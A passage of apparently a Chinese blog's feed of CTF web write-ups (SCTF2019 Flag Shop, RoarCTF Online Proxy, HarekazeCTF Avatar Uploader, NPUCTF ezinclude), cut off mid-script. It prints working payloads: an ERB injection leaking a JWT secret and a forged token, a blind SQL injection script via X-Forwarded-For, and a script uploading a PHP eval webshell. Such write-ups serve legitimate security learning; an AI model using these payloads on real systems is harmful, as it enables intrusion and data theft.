cookies[:auth] = auth</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/api/info&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/shop&quot; do</span><br><span class="line">  erb :shop</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/work&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  auth = auth[0]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line"></span><br><span class="line">    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">post &quot;/shop&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line"></span><br><span class="line">  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then</span><br><span class="line"></span><br><span class="line">    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)</span><br><span class="line">  else</span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def islogin</span><br><span class="line">  if cookies[:auth].nil? then</span><br><span class="line">    redirect to(&#x27;/shop&#x27;)</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>没见过的语言ruby<del>越学越糊涂，各种语言写的web应用层出不穷。。。</del></p><h2 id="00b-jwt伪造与erb模版注入"><a href="#00b-jwt伪造与erb模版注入" class="headerlink" title="00b.jwt伪造与erb模版注入"></a>00b.jwt伪造与erb模版注入</h2><h3 id="001-首先是jwt"><a href="#001-首先是jwt" class="headerlink" title="001.首先是jwt"></a>001.首先是jwt</h3><p>用火狐配合bp抓包。把auth的值放在jwt.io里面解一下码为以下内容<br><img src="/2020/11/07/SCTF2019-Flag-Shop//2.png"></p><p>改变金克拉的值可能需要先搞到<code>secret的值</code>，那就又回到了上面提示的源码了，里面有有关secret值得具体细节。</p><h3 id="002-erb模版注入"><a href="#002-erb模版注入" class="headerlink" title="002.erb模版注入"></a>002.erb模版注入</h3><p>这里从没学过这种ruby语言的我，瞬间不知所措，<del>这tm，太不讲武德了吧</del><br>看大lao说，work路由下的这个语句存在erb模版注入<code>ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;&quot;).result</code><br>然后限制了传入的字符的长度为不超过7个字符。<br>然后需要上传<code>do=&lt;%=$&#39;%&gt; is working</code>和<code>name=&lt;%=$&#39;%&gt;</code>，还得进行十六进制的编码。这个注入原理搞不太明白，似乎用到了ruby的预定义变量<code>$&#39;</code><br><img src="/2020/11/07/SCTF2019-Flag-Shop//4.png"><br>这里最后一次匹配到的string应该就是这里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br></pre></td></tr></table></figure><p>这里的第二步的auth，即又是第一步中的secret的环境变量，传入下面的payload以弹出secret<br><code>/work?SECRET=&amp;name=%3c%25%3d%24%27%25%3e&amp;do=%3c%25%3d%24%27%25%3e%20is%20working</code><br><img src="/2020/11/07/SCTF2019-Flag-Shop//5.png"><br>成功注出secret</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b357260d09e0bebbe9171c34e8228e17e618d4b76b559643ac5ec42d1c4c1215d4d9c8f0e337d8fc4b06db1d678b29c705ed6c55447e6ec47cfb7c8c8e68d926</span><br></pre></td></tr></table></figure><h2 id="00c-伪造JWT修改jkl"><a href="#00c-伪造JWT修改jkl" class="headerlink" title="00c.伪造JWT修改jkl"></a>00c.伪造JWT修改jkl</h2><p>输入secret改下自己的jkl为大于<code>1e+27</code>的值，我改为了<del><code>1e+30</code></del><code>这里错了，科学记数法为&lt;10e+30&gt;才表示10的30次方</code>。<del>我是傻逼</del>。肯定可以的啦。<br><img src="/2020/11/07/SCTF2019-Flag-Shop//6.png"><br><code>auth伪造值为</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiIzMDRiMjIxYi05Y2VmLTQ1MTktYTQxZi03NzQzZjYwYmIxOWIiLCJqa2wiOjFlKzMxfQ.mNl4xRVl9pH1Z9i06dcg4wiwf8VPoCysDP-AIdLsW-Q</span><br></pre></td></tr></table></figure><p><strong>回到页面点击<code>Buy Flag</code></strong></p><p>然后改下cookie的值<br><img src="/2020/11/07/SCTF2019-Flag-Shop//7.png"><br>得到新的jwt后解码获得flag。<br><img src="/2020/11/07/SCTF2019-Flag-Shop//8.png"></p><p><code>flag如下</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;546004d9-da90-492d-873e-e1c8246d9f10&#125;</span><br></pre></td></tr></table></figure><blockquote><p>又为你取出这把桐木琴，我又弹到如此用心。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> jwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RoarCTF-2019-Online_Proxy</title>
      <link href="/2020/11/07/RoarCTF-2019-Online-Proxy/"/>
      <url>/2020/11/07/RoarCTF-2019-Online-Proxy/</url>
      
        <content type="html"><![CDATA[<blockquote><p>我胯下的白马疾如闪电，那是远古的旷野，我从你的眼前掠过，甚至你看不清我的容颜，只有我背上银色的剑鞘，在阳光下瞬间闪耀的光芒，我一定要在黄昏之前到达，我要看到我的爱人，在夕阳里娇艳的容颜，和风铃响起时，她迎风漫舞的衣裙</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="300" height="86" src="//music.163.com/outchain/player?type=2&id=1401497267&auto=1&height=66"></iframe><h2 id="00a-sql注入判断"><a href="#00a-sql注入判断" class="headerlink" title="00a.sql注入判断"></a>00a.sql注入判断</h2><p>一开始看到下面的提示还以为是SSRF呢。年轻题，不讲武德，偷袭我，我大意了哈，没有闪。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">欢迎使用 Online Proxy。使用方法为 /?url=，例如 /?url=https://baidu.com/。</span><br><span class="line">为了保障您的使用体验，我们可能收集您的使用信息，这些信息只会被用于提升我们的服务，请您放心。</span><br></pre></td></tr></table></figure><p>结果测试了好多都是返回<code>Illegal scheme!</code>，只有用<code>https://baidu.com/</code>这个才可以，被迫放弃</p><p><strong>然后是怎么判断这是一个sql注入的呢？</strong></p><p>查看源代码后发现有如下的提示<br><img src="/2020/11/07/RoarCTF-2019-Online-Proxy//1.png"><br>观察到ip，然后它可能是把ip信息存入到数据库之中了，那我们就能利用<code>伪造ip(xxf)</code>来进行sql注入了<code>(使用burpsuite)</code>。<br><img src="/2020/11/07/RoarCTF-2019-Online-Proxy//2.png"></p><h2 id="00b-注入测试"><a href="#00b-注入测试" class="headerlink" title="00b.注入测试"></a>00b.注入测试</h2><p>首先测试一下能采取怎样的注入姿势</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 1&#x27; or &#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2020/11/07/RoarCTF-2019-Online-Proxy//4.png"><br>先传入一个<code>X-Forwarded-For: 1&#39; or &#39;1</code>然后，<code>current-ip</code>的值就变为了<code>1&#39; or &#39;1</code>，然后将<code>xff</code>的值变一下为任何其他值，可以是<code>l0ve</code>，再刷新，就变为了以下的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Debug Info: </span><br><span class="line"> Duration: 0.040457963943481 s </span><br><span class="line"> Current Ip: l0ve </span><br><span class="line">Last Ip: 1&#x27; or &#x27;1 --&gt;</span><br></pre></td></tr></table></figure><p>可见<code>Last ip</code>似乎已经上传到数据库之中了，然后什么都不改动，再刷新一下就得如下的回返</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Debug Info: </span><br><span class="line"> Duration: 0.03850793838501 s </span><br><span class="line"> Current Ip: l0ve </span><br><span class="line">Last Ip: 1 --&gt;</span><br></pre></td></tr></table></figure><p>发现服务端应该执行了sql查询，并且我们已经将语句注入。插入数据库数据的命令可能为如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name (current-ip,last-ip )</span><br><span class="line">                       VALUES</span><br><span class="line">                       (&#x27;$current-ip&#x27;,&#x27;$last-ip&#x27; );</span><br></pre></td></tr></table></figure><h2 id="00c-sql布尔盲注"><a href="#00c-sql布尔盲注" class="headerlink" title="00c.sql布尔盲注"></a>00c.sql布尔盲注</h2><p>可以用下面的payload来测试布尔盲注的效果<br><code>0&#39; or ascii(substr((select(database())),1,1))&gt;127 or &#39;0</code><br><code>0&#39; or ascii(substr((select(database())),1,1))&gt;32 or &#39;0</code><br>然后接连的三次，依次返回内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Debug Info: </span><br><span class="line"> Duration: 0.035021066665649 s </span><br><span class="line"> Current Ip: 0&#x27; or ascii(substr((select(database())),1,1))&gt;32 or &#x27;0 </span><br><span class="line">Last Ip: 0&#x27; or ascii(substr((select(database())),1,1))&gt;127 or &#x27;0 --&gt;</span><br><span class="line"></span><br><span class="line">/**下面分别对应上面的两个语句的判断真假，可见，第一个语句的判断为假，第二个为真*/</span><br><span class="line">&lt;!-- Debug Info: </span><br><span class="line"> Duration: 0.030755996704102 s </span><br><span class="line"> Current Ip: 0&#x27; or ascii(substr((select(database())),1,1))&gt;32 or &#x27;0 </span><br><span class="line">Last Ip: 0 --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Debug Info: </span><br><span class="line"> Duration: 0.054723024368286 s </span><br><span class="line"> Current Ip: 111 </span><br><span class="line">Last Ip: 1 --&gt;</span><br></pre></td></tr></table></figure><p>然后写爆破的脚本<code>一定要积累脚本</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://node3.buuoj.cn:27406/&quot;</span><br><span class="line">head = &#123;</span><br><span class="line">    &quot;GET&quot;: &quot;/ HTTP/1.1&quot;,</span><br><span class="line">    &quot;Cookie&quot;: &quot;track_uuid=fdb4b6d2-49df-4480-faf2-c1ff21685796&quot;,</span><br><span class="line">    &quot;X-Forwarded-For&quot;: &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1, 100):</span><br><span class="line">    print(&quot;第&#123;&#125;个:&quot;.format(i), end=&quot;&quot;)</span><br><span class="line">    l = 1</span><br><span class="line">    r = 127</span><br><span class="line">    mid = (l + r) &gt;&gt; 1     #相当于mid除2取整所得</span><br><span class="line">    while l &lt; r:</span><br><span class="line">        head[&quot;X-Forwarded-For&quot;] = &quot;0&#x27; or ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;0&#125;,1))&gt;&#123;1&#125; or &#x27;0&quot;.format(i, mid)</span><br><span class="line"></span><br><span class="line">        html_0 = requests.post(url, headers=head)</span><br><span class="line">        head[&quot;X-Forwarded-For&quot;] = &quot;0&#x27; or ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;0&#125;,1))&gt;&#123;1&#125; or &#x27;0&quot;.format(i, mid + 1)</span><br><span class="line"></span><br><span class="line">        html_0 = requests.post(url, headers=head)</span><br><span class="line">        html_0 = requests.post(url, headers=head)</span><br><span class="line"></span><br><span class="line">        if &quot;Last Ip: 1&quot; in html_0.text:  # 这里判断到的语句为第一个，即`.format(i, mid)`的那个</span><br><span class="line">            l = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            r = mid</span><br><span class="line">        mid = (l + r) &gt;&gt; 1</span><br><span class="line">    if chr(mid) == &#x27; &#x27;:</span><br><span class="line">        break</span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><blockquote><p>他这里的<code>group_concat()</code>必须带上以查询所有的库名。</p></blockquote><p>然后获得各个表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema,ctftraining,mysql,performance_schema,test,ctf,F4l9_D4t4B45e</span><br></pre></td></tr></table></figure><p><img src="/2020/11/07/RoarCTF-2019-Online-Proxy//5.png"><br>判断flag在<code>F4l9_D4t4B45e</code>库里面。</p><p>然后分别将语句再换为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&quot;0&#x27; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;F4l9_D4t4B45e&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125; or &#x27;0&quot;.format(i, mid)</span><br><span class="line">&quot;0&#x27; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;F4l9_D4t4B45e&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125; or &#x27;0&quot;.format(i, mid + 1)</span><br><span class="line">/**注出flag所在的表名为`F4l9_t4b1e`*/</span><br><span class="line"></span><br><span class="line">&quot;0&#x27; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;F4l9_t4b1e&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125; or &#x27;0&quot;.format(i, mid)</span><br><span class="line">&quot;0&#x27; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;F4l9_t4b1e&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125; or &#x27;0&quot;.format(i, mid + 1)</span><br><span class="line">/**注出flag所在的列名为`F4l9_C01uMn`*/</span><br><span class="line"></span><br><span class="line">&quot;0&#x27; or ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;0&#125;,1))&gt;&#123;1&#125; or &#x27;0&quot;.format(i, mid)</span><br><span class="line">&quot;0&#x27; or ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;0&#125;,1))&gt;&#123;1&#125; or &#x27;0&quot;.format(i, mid + 1)</span><br><span class="line">/**注出flag所在的flag为`flag&#123;G1zj1n_W4nt5_4_91r1_Fr1end&#125;,flag&#123;3f6f50df-e747-43db-a5fe-40facac027ba&#125;`,取第二个*/</span><br></pre></td></tr></table></figure><h2 id="00d-flag"><a href="#00d-flag" class="headerlink" title="00d.flag"></a>00d.flag</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3f6f50df-e747-43db-a5fe-40facac027ba&#125;</span><br></pre></td></tr></table></figure><blockquote><p>不记彼时月如勾。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> sql注入 </tag>
            
            <tag> 布尔盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HarekazeCTF2019-Avatar-Uploader-1</title>
      <link href="/2020/11/06/HarekazeCTF2019-Avatar-Uploader-1/"/>
      <url>/2020/11/06/HarekazeCTF2019-Avatar-Uploader-1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>画地为牢圈住的是什么。</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="300" height="86" src="//music.163.com/outchain/player?type=2&id=1376873330&auto=1&height=66"></iframe><h2 id="00a-关键代码"><a href="#00a-关键代码" class="headerlink" title="00a.关键代码"></a>00a.关键代码</h2><p>这里似乎是比赛的时候给出了源代码：<br><img src="/2020/11/06/HarekazeCTF2019-Avatar-Uploader-1//1.png"><br>下面的内容就是源代码中比较关键的部分了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// check file type</span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">$type = finfo_file($finfo, $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">finfo_close($finfo);</span><br><span class="line">if (!in_array($type, [&#x27;image/png&#x27;])) &#123;</span><br><span class="line">  error(&#x27;Uploaded file is not PNG format.&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// check file width/height</span><br><span class="line">$size = getimagesize($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">if ($size[0] &gt; 256 || $size[1] &gt; 256) &#123;</span><br><span class="line">  error(&#x27;Uploaded image is too large.&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if ($size[2] !== IMAGETYPE_PNG) &#123;</span><br><span class="line">  // I hope this never happens...</span><br><span class="line">  error(&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27; . getenv(&#x27;FLAG1&#x27;) . &#x27;&lt;/code&gt;&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后需要同时满足用这个<code>finfo_file</code>判断的结果为是一张PNG格式的图片，用<code>getimagesize()</code>判断的结果为不是一张PNG格式的图片。</p><p>那要利用这两个函数的不同之处了，他们的不同之处为：</p><blockquote><p>FILEINFO<code>(finfo)</code>可以识别<code>png图片(十六进制下)的第一行</code>，而<code>getimagesize()不可以</code>，即：我们的文件需要满足下面的代码所述的条件方可getflag</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line"></span><br><span class="line">var_dump(finfo_file($file, &quot;文件名&quot;));</span><br><span class="line"></span><br><span class="line">$f = getimagesize(&quot;文件名&quot;); </span><br><span class="line">var_dump($f[2] === IMAGETYPE_PNG);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/11/06/HarekazeCTF2019-Avatar-Uploader-1//2.png"><br>下面是<code>文件名</code>文件的生成过程，首先先找个png文件，或者你干脆用qq截图截一张图片，然后用winhex打开，选中选块为第一行的十六进制内容<code>CTRL+C</code>复制到内容<br><img src="/2020/11/06/HarekazeCTF2019-Avatar-Uploader-1//3.png"></p><p>然后新建<code>文件名</code>文件，用winhex再打开，将刚才复制到的内容粘贴到文件头里面去。（这里好像直接把一张png文件的十六进制内容除需要的文件头全部删掉也行，但是似乎稍显麻烦）<br><img src="/2020/11/06/HarekazeCTF2019-Avatar-Uploader-1//4.png"></p><p>然后刷新一下本地的网页获得结果如下图:<br><img src="/2020/11/06/HarekazeCTF2019-Avatar-Uploader-1//5.png"></p><h2 id="00b-上传文件，得flag"><a href="#00b-上传文件，得flag" class="headerlink" title="00b.上传文件，得flag"></a>00b.上传文件，得flag</h2><p>直接将我们刚才做好的文件上传到服务器就行了，然后就直接capture the flag了。<br><img src="/2020/11/06/HarekazeCTF2019-Avatar-Uploader-1//6.png"></p><p><strong>下面是flag</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;253d1171-2735-4d89-bc5c-7b4dccf267bc&#125;</span><br></pre></td></tr></table></figure><blockquote><p>纵使相逢应不识，尘满面，鬓如霜</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> php图片检查函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NPUCTF2020-ezinclude</title>
      <link href="/2020/11/06/NPUCTF2020-ezinclude/"/>
      <url>/2020/11/06/NPUCTF2020-ezinclude/</url>
      
        <content type="html"><![CDATA[<blockquote><p>当你想结束的时候，不如想想当初为什么开始。</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=402073807&auto=1&height=66"></iframe><h2 id="00a-提示"><a href="#00a-提示" class="headerlink" title="00a.提示"></a>00a.提示</h2><p>先看看源码，发现提示为如下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username/password error&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/11/06/NPUCTF2020-ezinclude//1.png"></p><p>可以看到页面定位到了这里<img src="/2020/11/06/NPUCTF2020-ezinclude//2.png">，访问该页面<code>/flflflflag.php</code>，得到如下结果<img src="/2020/11/06/NPUCTF2020-ezinclude//3.png"></p><p>这里可以用<code>php伪协议</code>读取源码，这里我们首先选择使用<code>file协议</code>读取源代码。<code>后来发现用file协议读不到关键的flflflflag.php文件，那就还用php伪协议读取文件</code><br><code>php://filter/convert.base64-encode/resource=flflflflag.php</code></p><h2 id="00b-源码"><a href="#00b-源码" class="headerlink" title="00b.源码"></a>00b.源码</h2><p><code>/flflflflag.php?file=php://filter/convert.base64-encode/resource=flflflflag.php</code><br><img src="/2020/11/06/NPUCTF2020-ezinclude//4.png">，解码后可得到<code>flflflflag.php</code>文件的内容为:<br><code>flflflflag.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span><br><span class="line">           window.location.href=&quot;404.html&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123;</span><br><span class="line">die(&#x27;nonono&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">echo &#x27;include($_GET[&quot;file&quot;])&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="00c-代码审计"><a href="#00c-代码审计" class="headerlink" title="00c.代码审计"></a>00c.代码审计</h2><p>关键的php代码为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123;</span><br><span class="line">die(&#x27;nonono&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">echo &#x27;include($_GET[&quot;file&quot;])&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里禁用了<code>data</code>、<code>input</code>、<code>zip</code>、<code>is</code>。</p><p>看wp，可以利用<code>php://filter/string.strip_tags导致php崩溃，同时可上传文件保存在/tmp目录</code>来上传木马。<br><a href="https://www.cnblogs.com/tr1ple/p/11301743.html">漏洞解析</a></p><h2 id="00d-exploit"><a href="#00d-exploit" class="headerlink" title="00d.exploit"></a>00d.exploit</h2><p>payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd</span><br></pre></td></tr></table></figure><p>师傅的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from io import BytesIO</span><br><span class="line">file_data=&#123;</span><br><span class="line">&#x27;file&#x27;: BytesIO(&quot;&lt;?php eval($_POST[sword]);&quot;)</span><br><span class="line">&#125;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">使用PYTHON上传马的固定格式应该就这样吧。</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">url=&quot;http://a83bc40c-ca4d-46b2-92b5-4ee0d17edafd.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">r=requests.post(url=url,files=file_data,allow_redirects=False)</span><br><span class="line">except:</span><br><span class="line">    